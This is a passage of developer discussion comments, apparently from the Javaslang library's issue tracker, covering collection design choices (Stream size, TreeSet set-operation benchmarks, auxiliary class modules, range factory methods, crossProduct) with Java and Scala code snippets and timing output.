developers. The user has to choose the right collection for the right purpose.\nIf you are able to achieve quick wins by tweaking the base implementation of a bit-mapped vector trie, that's ok.\nPlease keep also in mind that often performance comes at cost of memory. Such improvements are candidates to not make it into the code base. Examples of such improvements we rejected are the storage of additional variables per node (like lazy hash code) - or the recent drop optimizations etc.\nJust saying.\n. Fixed with #577 \n. After having slept about it I'm sure we can boost internal operations from O(n) to O(log n) or even eff. O(1). I will check that.\n. hehe\n. We will also move back from storing the size/length in a Stream. The use-case of a stream is lazy evaluation, like Iterator. Both have indefinite size. Therefore it is not common to ask a Stream for its size... If it is really, really needed, the user may memoize the size him/herself.\n. It can be - at the cost of computing the size at construction time, e.g. via subNodes.map(AbstractNode::size).sum().intValue(). But my performance measures showed, that this costs too much time.\nAn alternative is, that we add a lazy field Lazy<Integer> size = .... But when we want to calculate the size of a big collection, we first have to calculcate (once) all these lazy values in O(n). Ok, we do it only once, but at the cost of extra garbage/memory.\nHaving not a Lazy length is not really a disadvantage. If we need the size in an app more than once, we can introduce a local var instead of having an instance variable, e.g.\njava\nfinal int length = myMap.length(); // calculated once\nLet's have a look at other languages.\n. Or did you mean Stream? I also look at the memory footprint. And at the use-case for a specific collection type. Stream's strength is not size(). It's size is indefinite and maybe infinite. Vector is the right collection for that.\n. This is copied from Scala's source code (just for teaching purpose, we will not include that in Javaslang!):\nscala\noverride def length: Int = {\n    var len = 0\n    var left = this\n    while (!left.isEmpty) {\n      len += 1\n      left = left.tail\n    }\n    len\n  }\nSource: https://github.com/scala/scala/blob/v2.11.5/src/library/scala/collection/immutable/Stream.scala#L307-L315\n. Ok, let's try it. HAMT has to be changed than according to your description. Will you do it?\nI will keep an eye on the performance and optimize where necessary to get the best we can achieve for our collection...\n. Don't worry - these discussions bring us forward. Code is changing. If it turns worse (like my change) we turn it even better as before.\n. Great ideas by @ruslansennov to improve or HAMT size() calculation and also Vector optimization.\nRegarding this issue we will only remove the cached length and hashCode of Stream because it is a collection of indefinite size and not the best choice to be stored in a HashSet/HashMap.\nIn general we should look at Scala. I'm not convinced of storing extra lazy fields per collection node to cache information. The need for a lazy hashCode in general should be re-considered again.\n. Stream has now size with O(n), as expected for undetermined length.\nHAMT.size calculation was optimized by Ruslan.\n. Pre-caching random generated testees leads to:\nTreeSet.difference(TreeSet) bench(1000) took 3.217 sec.\nTreeSet.removeAll(TreeSet) bench(1000) took 1.712 sec.\nTreeSet.difference(TreeSet) bench(900) took 2.967 sec.\nTreeSet.removeAll(TreeSet) bench(900) took 1.437 sec.\nTreeSet.difference(TreeSet) bench(800) took 2.643 sec.\nTreeSet.removeAll(TreeSet) bench(800) took 1.294 sec.\nTreeSet.difference(TreeSet) bench(700) took 2.21 sec.\nTreeSet.removeAll(TreeSet) bench(700) took 1.075 sec.\nTreeSet.difference(TreeSet) bench(600) took 1.819 sec.\nTreeSet.removeAll(TreeSet) bench(600) took 0.902 sec.\nTreeSet.difference(TreeSet) bench(500) took 1.579 sec.\nTreeSet.removeAll(TreeSet) bench(500) took 0.762 sec.\nTreeSet.difference(TreeSet) bench(400) took 1.233 sec.\nTreeSet.removeAll(TreeSet) bench(400) took 0.628 sec.\nTreeSet.difference(TreeSet) bench(300) took 0.892 sec.\nTreeSet.removeAll(TreeSet) bench(300) took 0.476 sec.\nTreeSet.difference(TreeSet) bench(200) took 0.574 sec.\nTreeSet.removeAll(TreeSet) bench(200) took 0.337 sec.\nTreeSet.difference(TreeSet) bench(100) took 0.327 sec.\nTreeSet.removeAll(TreeSet) bench(100) took 0.15 sec.\n. After some optimizations we clearly see, that RedBlackTree.difference() is really fast compared to removeAll(). No need to remove it.\nTreeSet.diff(TreeSet) bench(1000) took 0.448 sec.\nTreeSet.removeAll(TreeSet) bench(1000) took 1.405 sec.\nTreeSet.diff(TreeSet) bench(900) took 0.151 sec.\nTreeSet.removeAll(TreeSet) bench(900) took 1.266 sec.\nTreeSet.diff(TreeSet) bench(800) took 0.143 sec.\nTreeSet.removeAll(TreeSet) bench(800) took 1.228 sec.\nTreeSet.diff(TreeSet) bench(700) took 0.118 sec.\nTreeSet.removeAll(TreeSet) bench(700) took 1.007 sec.\nTreeSet.diff(TreeSet) bench(600) took 0.097 sec.\nTreeSet.removeAll(TreeSet) bench(600) took 0.843 sec.\nTreeSet.diff(TreeSet) bench(500) took 0.078 sec.\nTreeSet.removeAll(TreeSet) bench(500) took 0.698 sec.\nTreeSet.diff(TreeSet) bench(400) took 0.065 sec.\nTreeSet.removeAll(TreeSet) bench(400) took 0.577 sec.\nTreeSet.diff(TreeSet) bench(300) took 0.047 sec.\nTreeSet.removeAll(TreeSet) bench(300) took 0.445 sec.\nTreeSet.diff(TreeSet) bench(200) took 0.032 sec.\nTreeSet.removeAll(TreeSet) bench(200) took 0.28 sec.\nTreeSet.diff(TreeSet) bench(100) took 0.018 sec.\nTreeSet.removeAll(TreeSet) bench(100) took 0.131 sec.\n. Same for intersect()...\nTreeSet.intersect(TreeSet) bench(1000) took 0.284 sec.\nTreeSet.retainAll(TreeSet) bench(1000) took 3.108 sec.\nTreeSet.intersect(TreeSet) bench(900) took 0.2 sec.\nTreeSet.retainAll(TreeSet) bench(900) took 2.698 sec.\nTreeSet.intersect(TreeSet) bench(800) took 0.177 sec.\nTreeSet.retainAll(TreeSet) bench(800) took 2.629 sec.\nTreeSet.intersect(TreeSet) bench(700) took 0.159 sec.\nTreeSet.retainAll(TreeSet) bench(700) took 2.227 sec.\nTreeSet.intersect(TreeSet) bench(600) took 0.158 sec.\nTreeSet.retainAll(TreeSet) bench(600) took 1.895 sec.\nTreeSet.intersect(TreeSet) bench(500) took 0.124 sec.\nTreeSet.retainAll(TreeSet) bench(500) took 1.592 sec.\nTreeSet.intersect(TreeSet) bench(400) took 0.094 sec.\nTreeSet.retainAll(TreeSet) bench(400) took 1.279 sec.\nTreeSet.intersect(TreeSet) bench(300) took 0.076 sec.\nTreeSet.retainAll(TreeSet) bench(300) took 0.92 sec.\nTreeSet.intersect(TreeSet) bench(200) took 0.052 sec.\nTreeSet.retainAll(TreeSet) bench(200) took 0.602 sec.\nTreeSet.intersect(TreeSet) bench(100) took 0.025 sec.\nTreeSet.retainAll(TreeSet) bench(100) took 0.332 sec.\n. And union()...\nTreeSet.union(TreeSet) bench(1000) took 0.375 sec.\nTreeSet.addAll(TreeSet) bench(1000) took 1.706 sec.\nTreeSet.union(TreeSet) bench(900) took 0.237 sec.\nTreeSet.addAll(TreeSet) bench(900) took 1.472 sec.\nTreeSet.union(TreeSet) bench(800) took 0.215 sec.\nTreeSet.addAll(TreeSet) bench(800) took 1.379 sec.\nTreeSet.union(TreeSet) bench(700) took 0.184 sec.\nTreeSet.addAll(TreeSet) bench(700) took 1.134 sec.\nTreeSet.union(TreeSet) bench(600) took 0.166 sec.\nTreeSet.addAll(TreeSet) bench(600) took 1.014 sec.\nTreeSet.union(TreeSet) bench(500) took 0.134 sec.\nTreeSet.addAll(TreeSet) bench(500) took 0.815 sec.\nTreeSet.union(TreeSet) bench(400) took 0.111 sec.\nTreeSet.addAll(TreeSet) bench(400) took 0.654 sec.\nTreeSet.union(TreeSet) bench(300) took 0.081 sec.\nTreeSet.addAll(TreeSet) bench(300) took 0.507 sec.\nTreeSet.union(TreeSet) bench(200) took 0.051 sec.\nTreeSet.addAll(TreeSet) bench(200) took 0.305 sec.\nTreeSet.union(TreeSet) bench(100) took 0.029 sec.\nTreeSet.addAll(TreeSet) bench(100) took 0.174 sec.\n. Super-cool! This issue can be obviously closed.\n. Huge, thx!\nPlease prepare yourself mentally that with #578 the n >= length() et al. checks will disappear because length() is now O(n). This is the right direction. I'm sure, other libs act the same to keep the performance of the core operations at the limit of the possible.\n. Thank you, Ruslan, LGTM!\n. Mmhh, sometimes the cloud has no more capacity. I think it will start in a few minutes...\n. Seems to be stuck. I will merge now. Then a new build is started.\n. Travis is still not operational. Does not matter, if local builds are working via mvn clean test.\n. Also added missing Set javadoc\n. @ruslansennov travis-ci.org has build delays: https://www.traviscistatus.com/incidents/wf340mcz8zq0\ntime to sleep :) 'night!\n. nice - thx!\n. Fixes #563\n. ok - I will deep-dive into it now......\n. This L really GTM! It is a great Idea to internally shift the index for front operations!\nI will now merge it...\n. Yes, I got aware of it as I read your blog some months ago :) Should have linked it. Thx!\n. Local classes are moved to the outside within the same file and are made package private. By convention the class will be named like the (probably one and only) public method of the local class.\nBefore:\ninterface Stream<T> {\n    default Stream<T> appendSelf() {\n        class Recursion { \n            ...\n            stream();\n        }\n        return isEmpty() ? this : new Recursion(this).stream();\n    }\n}\nAfter:\n```\ninterface Stream {\n    default Stream appendSelf() {\n        return isEmpty() ? this : new AppendSelf(this).stream();\n    }\n}\n// command pattern, equivalent to a function, may be moved to a private interface class with Java 9+\nfinal class AppendSelf {\n    ...\n    stream();\n}\n```\n. Lambdas do not hold a reference to the enclosing instance by default (see \"State of the Lambda\", Pt. 7 and \"Trying Out Lambda Expressions in the Eclipse IDE\", Section \"this in Lambda Expressions\").\n. \u2728\ud83d\udc4d\ud83c\udffd\u2728\n. I don't like abstract classes as first class API. Let's do the following instead which, according to javadoc, also works to hide classes from public API: We move the inner classes to the outside within the same file.\n```\npublic interface HashArrayMappedTrie extends java.lang.Iterable> {\n    ...\n}\nabstract class AbstractNode implements HashArrayMappedTrie {\n    ...\n}\nclass ArrayNode ... { ... }\n...\n```\n. I will do this with #592, which will hide all classes all over our library, which are not intended to be public api.\n. Fixed with #610 \n. Example:\njava\npublic interface Stream<T> {\n    final class Nil<T> implements Stream<T> {\n        ...\n    }\n}\nwill be\n``` java\npublic interface Stream {\n}\n// formerly Nil to avoid name clash with List.Nil\nfinal class EmptyStream implements Stream {\n}\n```\n. TODO:\n- Stream.combinations()\n- Stream.dropRight()\n. We prefix names of auxiliary classes with the name of the public class or with an abbr. that makes sense. This will avoid name clashes.\nExample:\n- Stream.Cons will be renamed to StreamCons\n. List.Nil and List.Cons will be moved top-level into a package, i.e. Nil and Cons.\n. It is ugly to prefix the auxiliary classes with the public interface name, e.g.\n``` java\n// file Stream.java\npublic interface Stream {\n}\nfinal class StreamEmpty {\n}\nfinal class StreamCons {\n}\n```\nTherefore we will define modules / namespaces:\n``` java\n// file Stream.java\npublic interface Stream {\n}\ninterface StreamModule {\nfinal class Empty {\n}\n\nfinal class Cons {\n}\n\n}\n```\n. The trick is\njava\nimport javaslang.collection.StreamModule.*;\nThen it is just new Empty().\nThe classes within StreamModule are used only within Stream (within the same file). Otherwise the javac -Xlint generates a warning and compiler errors because of our maven config. (I think so...)\n. But you are right - if we cover other public classes within the same package, like List Cons, we have to fully qualify them. But I think these cases currently not exist (or are extremely rare).\n. Yep, StreamModule.Cons clashes with javaslang.collection.Cons (in my local fork).\n. We need to explicitely import Cons like so:\njava\nimport javaslang.collection.StreamModule.*;\nimport javaslang.collection.StreamModule.Cons;\nThe static typing makes it safe to use unqualified Cons and prevents us from confusing it with List Cons.\n. Yep, compiling with javac args -Xlint:all -Werror (which is default for Javaslang) leads to a compile error if we access an auxiliary module from the outside of a file:\n[WARNING] /Users/daniel/git/javaslang/src/test/java/javaslang/collection/RedBlackTreeTest.java:[9,28] auxiliary class javaslang.collection.RedBlackTreeModule in RedBlackTree.java should not be accessed from outside its own source file\nThis makes auxiliary modules great for designing Java 8 APIs based on interfaces which need additional, internal types, which should not be part of the public API. Especially these modules allow to declare classes with names, which may otherwise be ambiguous if located in the same package.\n. Disadvantage: the internal classes, part of the auxiliary module, are not accessible from a unit test (with -Xlint:all -Werror) :(\n. On the other hand this is also an advantage regarding clean interface design. I'm not a big fan of whitebox tests. Whitebox testing implies the leakage of implementation details to the outside. Tests are more robust against refactoring and changes of implementation details when they are formulated on a high level. The variety of business cases implies the coverage quality.\n. I'm not sure if we really need to make Cons and Nil (of List) public. Java (and Javaslang) currently do not have deep, structural pattern matching. The List.isEmpty() method should be sufficient for now to distinguish between Cons and Nil.\n- List.of(elem) is the same as new Cons<>(elem)\n- List.empty() is the same as Nil.instance()\nWe should keep it simple and hide Cons and Nil. They can be still added later as public API, if needed, without affecting/breaking existing code.\n. I'm torn back and forth regarding Cons an Nil. We need a consistent way to integrate structural collection types.\nStatus Quo:\n- List has Cons and Nil which are public first-level API (located in the same package).\n- Stream has Cons and Empty which are hidden in a module interface and not public API\nTo keep it consistent, we will move Cons & Nil and Cons & Empty back to List and Stream (as static inner classes. This avoids name clashes and makes these types available for pattern matching via Match.\n. AbstractIterator is public API and will remain in javaslang.collection.\n. Fixed\n. The only methods Nil and Cons should implement are isEmpty(), head() and tail().\nUpdate: Nil and Cons are of Type List and will be moved out of List to javaslang.collection. In turn Stream.Cons and Stream.Nil are made internal API (as described above). Btw - this may play well together with pulling IO Streaming, where the first element is deferrend (maybe eof io stream!).\n. Note: We previously splitted the methods in order to be able to declare the most specific return type possible. Example: Nil.take(n) definitely returns a Nil and not a Cons. But in practice users of the List API work with the List interface. This issue works like a magnet, it brings code which belongs together back to one place. This reduces the complexity of the code and really improves the maintainability of our codebase.\n. We should add Try.getCause(). Additionally we should specify a clear Try interface and not rely on inherited API from Value. I.e. Try needs to declare (and document!) get() et al.\n. Fixed with the previous commits.\n. Look to me that the lazy head is not needed any more. When changing it, replace also ((Cons<T>) this).head with head() in Stream.\n. We have a regression here. I added a unit test according to #327 and will fix the problem.\n. This is the test (Javaslang vs Java):\n``` java\n    @Test\n    public void shouldNotEvaluateHeadOfTailWhenCallingIteratorHasNext() {\n    final StringBuilder result1 = new StringBuilder();\n    final List<Integer> vals1 = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9);\n    flatTryWithJavaslangStream(vals1, i -> doStuff(i, result1));\n\n    final StringBuilder result2 = new StringBuilder();\n    final Integer[] vals2 = new Integer[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };\n    flatTryWithJavaStream(vals2, i -> doStuff(i, result2));\n\n    System.out.println(result1.toString());\n    System.out.println(result2.toString());\n\n    assertThat(result1.toString()).isEqualTo(result2.toString());\n}\n\nprivate <T> Try<Void> flatTryWithJavaslangStream(List<T> vals, Try.CheckedConsumer<T> func) {\n    return vals.toStream()\n            .map(v -> Try.run(() -> func.accept(v)))\n            .findFirst(Try::isFailure)\n            .orElseGet(() -> new Success<>(null));\n}\n\nprivate <T> Try<Void> flatTryWithJavaStream(Integer[] vals, Try.CheckedConsumer<Integer> func) {\n    return java.util.stream.Stream.of(vals)\n            .map(v -> Try.run(() -> func.accept(v)))\n            .filter(Try::isFailure)\n            .findFirst()\n            .orElseGet(() -> new Success<>(null));\n}\n\nprivate String doStuff(int i, StringBuilder builder) throws Exception {\n    builder.append(i);\n    if (i == 5) {\n        throw new Exception(\"Some error !!!\");\n    }\n    return i + \" Value\";\n}\n\n```\nJavaslang prints 123456\nJava prints 12345\nTested it also with Scala:\n``` scala\nimport scala.Stream\nimport scala.util.Try\nimport scala.util.Failure\nobject Test {\ndef main(args: Array[String]) {\nval fun = (i: Int) => {\n  println(i)\n  if (i == 5) throw new Exception()\n  i\n}\n\nStream(1, 2, 3, 4, 5, 6, 7, 8, 9)\n  .map(i => Try(fun(i)))\n  .find(t => t match {\n    case Failure(_) => true\n    case _ => false\n  })\n\n}\n}\n```\nScala prints 12345.\nQuestion: how does Scala do this? Cons also has an eager head as far as I know. This means, asking the tail if it is empty should also evaluate the tail head. I will investigate this.\n. Scala has a 'lazy' StreamIterator. This does also the trick for us:\n``` java\nfinal class StreamIterator extends AbstractIterator {\nLazy<Stream<T>> stream;\n\nStreamIterator(Stream<T> stream) {\n    this.stream = Lazy.of(() -> stream);\n}\n\n@Override\npublic boolean hasNext() {\n    return stream.get().isDefined();\n}\n\n@Override\npublic T next() {\n    if (!hasNext()) {\n        Iterator.empty().next();\n    }\n    final Stream<T> current = stream.get();\n    stream = Lazy.of(current::tail);\n    return current.head();\n}\n\n}\n```\n. Scala has it (http://www.scala-lang.org/api/2.11.5/index.html#scala.collection.immutable.Map). We should stay with it, too.\nREPL says:\n```\nthis is longer than that\nscala> Map(1 -> 'a', 2 -> 'b', 3 -> 'c').zipAll(List(6, 7), (99 -> 'z'), 99)\nres0: scala.collection.immutable.Map[Any,Int] = Map((1,a) -> 6, (2,b) -> 7, (3,c) -> 99)\nthis is shorter than that\nscala> Map(1 -> 'a', 2 -> 'b', 3 -> 'c').zipAll(List(4, 5, 6, 7), (99 -> 'z'), 99)\nres1: scala.collection.immutable.Map[(Int, Char),Int] = Map((1,a) -> 4, (2,b) -> 5, (3,c) -> 6, (99,z) -> 7)\nthisElem is null\nscala> Map(1 -> 'a', 2 -> 'b', 3 -> 'c').zipAll(List(4, 5, 6, 7), null, 99)\nres2: scala.collection.immutable.Map[(Int, Char),Int] = Map((1,a) -> 4, (2,b) -> 5, (3,c) -> 6, null -> 7)\nthisElem repeats more than once\nscala> Map(1 -> 'a', 2 -> 'b').zipAll(List(4, 5, 6, 7), (99 -> 'z'), 99)\nres3: scala.collection.immutable.Map[(Int, Char),Int] = Map((1,a) -> 4, (2,b) -> 5, (99,z) -> 7)\n```\n\n\nwe can't produce resulting map if thisElem is null\n\n\nwe allow null keys, aren't we?\n\n\nwe can't produce resulting map if thisElem repeats more than once\n\n\nit is defined behavior to overwrite values\n. of cause :)\nWe allow null to be inserted into RedBlackTree and therefore into (future) TreeMap, if the comparator is able to compare nulls. I.e. java.util.Comparator.nullsFirst().\nIf we use Objects.hashCode(object), we are fine with inserting null into HashMap:\n\npublic static int hashCode(Object o) {\n        return o != null ? o.hashCode() : 0;\n    }\n. For SortedSet / TreeSet this is true. Similar to java.util.TreeSet, there can occur RuntimeException, if the generic type is not comparable. When we create a new SortedSet, we are fine - the factory methods are safe and take care of choosing the right comparator. But Java's type system doesn't allow us to change the inherited generics of Set. So, for example, the map method's result component type U has to be comparable by convention.\n. If Tuple needs these, we will implement them. E.g. component-wise comparision.\n. What's wrong with Tuple's hashCode? Looks good to me...\n. Top! :+1: \n. All is done here. Comparable Tuples is part of #605 \n. Sorry, thought #603 fixed it, but HashMap.zipAll is still open. TreeMap is another story.\n. The original issue is finished. We will take care of comparable tuples returned by TreeMap.zipAll (see #428).\n. Great!! Thx!\n. Take care of CharSeq.subSequence() (inherited from CharSequence) and CharSeq.substring() (from String).\n. subSequence() vs. slice()\n\nWe may add Seq.subSequence(int) and Seq.subSequence(int, int) in addition to slice(int) and slice(int, int).\nThe difference is that subSequence throws IndexOutOfBoundsException.\nLet's have both methods.\n. TODO: let CharSeqTest extends AbstractSeqTest if possible and remove code duplication.\nTODO: Merge CharSeqTest and StringTest\n. @jasoet-gdp Yes, you are right. All sub-classes need to be changed.\n. We will remove slice(beginIndex) since it has exactly the same semantics as drop(count) (even if slice() takes an index and drop() take a count).\nHowever, subSequence(beginIndex) is still needed because it throws on invalid index.\n. oh, wow! Iterator pays off!\n. Thx! On each merge I see the 2.0.0 coming nearer :-)) I target a release within the next 4 weeks.\n. Map implementations:\n- HashMap implements Map (no order)\n- LinkedHashMap extends HashMap (insertion order)\n- TreeMap implements SortedMap (ascending key order, natural order by default, alternatively by user-defined comparator)\n. One limitation of Java's type system is that method return types are only partially covariant. This comes into play when providing more hash-based Set or Map implementations.\nLet's take a look at the Set interface.\n``` java\ninterface Set {\nSet<T> take(int n);\n\nOption<? extends Set<T>> initOption();\n\n}\n```\nThen this is a simple example to make the return type of a method more specific in a sub-class (public modifiers omitted):\njava\nclass HashSet<T> implements Set<T> {\n    @Override\n    HashSet<T> take(int n) { ... }\n}\nBut if the return type has more complex generics, this is not possible any more:\n``` java\nclass HashSet implements Set {\n    @Override\n    Option> initOption() { ... }\n}\nclass LinkedHashSet extends HashSet {\n    @Override\n    // DOES NOT COMPILE\n    Option> initOption() { ... }\n}\n```\nThere are two solution:\n1) Open the return type for extension\n``` java\n/\n     Set\n      ^\n      |\n   HashSet\n      ^\n      |\nLinkedHashSet\n/\nclass HashSet implements Set {\n    @Override\n    Option<? extends HashSet> initOption() { ... }\n}\nclass LinkedHashSet extends HashSet {\n    @Override\n    Option<? extends LinkedHashSet> initOption() { ... }\n}\n```\n2) Flatten the hierarchy\n``` java\n/\n       Set\n        ^\n       / \\\nHashSet   LinkedHashSet\n/\nfinal class HashSet implements Set {\n    @Override\n    Option> initOption() { ... }\n}\nfinal class LinkedHashSet extends Set {\n    @Override\n    Option> initOption() { ... }\n}\n```\nCurrently I tend to take the second approach and not let LinkedHashSet extends HashSet. It should be sufficient to specify the nature of a data structure (like being a sequence or a set of unique elements) at the declaration site.\nI think the situation is rare that an API specifies a class HashSet instead of an interface Set (which is always preferable) and then returns a LinkedHashSet. If the information, that insertion order is preserved, is important, then the API will specify LinkedHashSet directly and not HashSet.\n. @chronodm \n\nIs there a reason LinkedHashSet doesn't override toLinkedSet() to return this?\n\nWe designed the conversion methods the way that they are implemented in Value and not overridden by any class. For example toTreeSet() is implemented like this:\njava\ndefault SortedSet<T> toSortedSet() throws ClassCastException {\n        if (this instanceof TreeSet<?>) {\n            return (TreeSet<T>) this;\n        } else {\n            final Comparator<T> comparator = (this instanceof Ordered<?>)\n                    ? ((Ordered<T>) this).comparator()\n                    : (Comparator<T>) Comparator.naturalOrder();\n            return toSortedSet(comparator);\n        }\n    }\nWe should do the same for toLinkedSet().\n\nAnd is there a reason toLinkedSet() returns Set rather than LinkedHashSet?\n\nOnce, there was a discussion about returning implementations or interfaces. We decided to return interfaces (but there exist no Linked* interfaces, yet - like in Scala).\nThere was also a discussion about adding Linked* interfaces but we decided to align to Scala.\nHowever, I see the benefit of making it clear on the type level that a Set or Map ist linked. I would prefer to add LinkedSet and LinkedMap interfaces over returning concrete implementation classes.. To keep it simple, we concentrate on char, double, int and long. Java does the same for java.util.stream.Stream. If byte, float or short is needed, map needs to be called with a cast. If it is really needed, a future version of Javaslang may support byte, float and short here.\nThe following types need to have the range* methods:\n- Array\n- Vector\n- List\n- Queue\n- Stream\n- Stack\nExceptions:\n- CharSeq: It only implements range*(char) because it acts on Character elements only.\n- Iterator: It does not extends Seq but it implements all range* methods.\nStatic factory methods of Seq implementations (example: List):\n``` java\n// java.util.stream\nstatic  Collector, List> collector()\n// default\nstatic  List empty()\nstatic  List of(T element)\nstatic  List of(T... elements)\nstatic  List ofAll(java.lang.Iterable<? extends T> elements)\n// primitive arrays\nstatic List ofAll(boolean[] array)\nstatic List ofAll(byte[] array)\nstatic List ofAll(char[] array)\nstatic List ofAll(double[] array)\nstatic List ofAll(float[] array)\nstatic List ofAll(int[] array)\nstatic List ofAll(long[] array)\nstatic List ofAll(short[] array)\n// range/rangeBy\nstatic List range(char from, char toExclusive)\nstatic List rangeBy(char from, char toExclusive, int step)\nstatic List range(double from, double toExclusive)\nstatic List rangeBy(double from, double toExclusive, double step)\nstatic List range(int from, int toExclusive)\nstatic List rangeBy(int from, int toExclusive, int step)\nstatic List range(long from, long toExclusive)\nstatic List rangeBy(long from, long toExclusive, long step)\n// rangeClosed/rangeClosedBy\nstatic List rangeClosed(char from, char toExclusive)\nstatic List rangeClosedBy(char from, char toExclusive, int step)\nstatic List rangeClosed(double from, double toExclusive)\nstatic List rangeClosedBy(double from, double toExclusive, double step)\nstatic List rangeClosed(int from, int toInclusive)\nstatic List rangeClosedBy(int from, int toInclusive, int step)\nstatic List rangeClosed(long from, long toInclusive)\nstatic List rangeClosedBy(long from, long toInclusive, long step)\n```\nStream and Iterator additionally have (modulo return type):\n``` java\n// generators\nstatic Stream from(int value)\nstatic Stream from(long value)\nstatic  Stream gen(Supplier<? extends T> supplier)\nstatic  Stream gen(T seed, Function<? super T, ? extends T> f)\n// Stream only\nstatic  Stream cons(T head, Supplier<? extends Stream> tailSupplier)\n// Iterator only\nstatic  Iterator ofIterators(Iterator<? extends T>... iterators)\nstatic  Iterator ofIterables(java.lang.Iterable<? extends T>... iterables)\nstatic  Iterator ofIterators(Iterator<? extends Iterator<? extends T>> iterators)\nstatic  Iterator ofIterables(Iterator<? extends java.lang.Iterable<? extends T>> iterables)\nstatic  Iterator ofIterators(java.lang.Iterable<? extends Iterator<? extends T>> iterators)\nstatic  Iterator ofIterables(java.lang.Iterable<? extends java.lang.Iterable<? extends T>> iterables)\n```\n. Like the others, 1.0d. I haven't thought about real-world relevance here...\n. Simplification: It is sufficient to use\njava\nstatic <T> Iterator<T> concat(java.lang.Iterable<? extends T>... iterables)\nstatic <T> Iterator<T> concat(java.lang.Iterable<? extends java.lang.Iterable<? extends T>> iterables)\nin favor of the following methods, which will be removed:\njava\n// Iterator only\nstatic <T> Iterator<T> ofIterators(Iterator<? extends T>... iterators)\nstatic <T> Iterator<T> ofIterables(java.lang.Iterable<? extends T>... iterables)\nstatic <T> Iterator<T> ofIterators(Iterator<? extends Iterator<? extends T>> iterators)\nstatic <T> Iterator<T> ofIterables(Iterator<? extends java.lang.Iterable<? extends T>> iterables)\nstatic <T> Iterator<T> ofIterators(java.lang.Iterable<? extends Iterator<? extends T>> iterators)\nstatic <T> Iterator<T> ofIterables(java.lang.Iterable<? extends java.lang.Iterable<? extends T>> iterables)\n. @lukaseder Yep - will remove range(double from, double toExclusive) and rangeClosed(double from, double toExclusive).\n. Scala has rangeBy(from: T, to: T, step: T) and implicit type conversion, e.g. from char to int. We do not have this kind of type conversion in Java and therefore cannot provide a rangeBy(char from, char toExclusive, char step). Instead we will have a rangeBy(char from, char toExclusive, short step). The type short fits best here, because it is the same precision as char.\nInteresting: rangeBy(char, char, short) does not work well because 1 is not recognized as short by Java. We change it to int then.\nAlso interesting: When we call rangeBy('a', 'z', 1), Java matches the signature rangeBy(int, int, int). It would be cool to have only the (int, int, int) method but unfortunately the result is Seq<Integer> instead of Seq<Character>, so we still need the (char, char, int) method to get the return type right.\nNote: In general a (T, T, T) signature is what we want to have, with T < Numeric and automatic type conversion of the step. But that's not possible (in Java).\n. double is fun...\n- NaN (we should throw an IllegalArgumentException)\n- positive, negative infinity (have to test, if we set infinity as start - should be ok for Stream and Iterator, but not for non-lazy collections)\n- fortunately == treats positive zero +0d and negative zero -0d the same\n- included/excluded cases are different than in the discrete methods\n/cc @lukaseder\n. Basically there are the following tests scenarios:\n- step == 0\n- from == to, step < 0\n- from == to, step > 0\n- from < to, step < 0\n- from < to, step > 0\n- from > to, step < 0\n- from > to, step > 0\nAdditionally we have to test these special cases\n(where MIN/MAX may also be NEGATIVE_INFINITY, POSITIVE_INFINITY):\n- from = MAX, to = MAX, step < 0\n- from = MAX, to = MAX, step > 0\n- from = MIN, to = MIN, step < 0\n- from = MIN, to = MIN, step > 0\n- from = MAX - x, to = MAX, step > 0, 0 < x < step\n- from = MAX - step, to = MAX, step > 0\n- from = MAX - x, to = MAX, step > 0, x > step\n- from = MIN, to = MIN - x, step < 0, 0 > x > step\n- from = MIN, to = MIN - step, step < 0\n- from = MIN, to = MIN - x, step < 0, x < step\nAll of these scenarios are multiplied with\n- the inclusive and exclusive case\n- the with and without step case\n. Without loss of generality (POS/NEG INF) it should make sense to allow\n``` java\n// = empty\nrangeBy(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, step);\n// = rangeClosed(finiteDouble, Double.MAX_VALUE, positiveStep)\nrangeBy(finiteDouble, Double.POSITIVE_INFINITY, positiveStep);\n```\nBut closing over INFINITY is prohibited, if the other range bound is finite.\n. We have to live with some floating point arithmetic blur:\njava\nDouble.MAX_VALUE                     // = 1.7976931348623157E308\nDouble.MAX_VALUE - 3.0E307           // = 1.4976931348623158E308\nDouble.MAX_VALUE - 3.0E307 + 3.0E307 // = Infinity\nGiven that it might be, that the last, inclusive number of a closed range of doubles is not part of the result.\n. Additionally we need some sort of emergency exit for double ranges because\njava\nDouble.MAX_VALUE + 1.0 = Double.MAX_VALUE\nI.e. we may loop forever.\n(Note: but Double.MAX_VALUE + 1.0E292 = Double.POSITIVE_INFINITY)\n. #613, #614 and #615 are driven by the jOOQ blog post How to use Java 8 Functional Programming to Generate an Alphabetic Sequence.\nHaving these, we should be able to write the following to solve the puzzle:\njava\nSeq<Character> alphabet = CharSeq.rangeClosed('A', 'Z');\nStream.from(1)\n      .flatMap(alphabet::crossProduct)\n      .map(Seq::mkString)\n      .takeUntil(\"AAA\"::equals);\n/cc @lukaseder\n. Yes, you are right. I have to think about it. Maybe power()...\n. Yes, http://de.mathworks.com/help/symbolic/mupad_ref/solvelib-cartesianpower.html\nI like your generalization using tuples.\n. Oh, I just meant the API for cross-joining multiple Seqs - I realized that Javaslang is missing such API. It is not really a generalization but there is no other possibility to capture different generic component types.\n. I will stay with the name crossProduct to 'keep the API together'.\nThe most general form of a cartestian product (or cross product or simply product) is the n-ary cartesian product, e.g. X1 x X2 x ... x Xn = (x1, x2, ..., xn) with x1 \u2208 X1, ..., xn \u2208 Xn.\nThe cartesian power is a special case of the n-ary cartesian product, where the Xi = Xj for all i, j \u2208 {1, ..., n}.\nHere crossProduct(int n) denotes X\u207f = X x X ... x X (n times).\nTo make it more clear I will name the parameter power: crossProduct(int power).\n. > which is generally more useful and user-friendly than the mathematical nested tuples.\n:+1:\n\nI'm a pragmatic SQL person, not a maths person :)\n\nwe need pragmatic solutions and not 'in theory there exists a solution - I can prove it' :-)\n. Another, relatively fast solution for the blog post puzzle using Javaslang:\n``` java\n// Example: solvePuzzle(CharSeq.rangeClosed('A', 'Z'), 2)\nstatic  Stream> solvePuzzle(TraversableOnce alphabet, int n) {\n    if (n < 0) {\n        throw new IllegalArgumentException(\"negative n\");\n    }\n    return alphabet.sliding(1).toStream()\n            .appendSelf(stream -> stream.flatMap(product -> alphabet.map(product::append)))\n            .take(sumOfPowers(alphabet.length(), n));\n}\n//  n\n//  \u03a3 k\u2071 = k\u00b9 + k\u00b2 + ... + k\u207f\n// i=1\nprivate static int sumOfPowers(int k, int n) {\n    int product = k;\n    int sum = product;\n    for (int i = 1; i 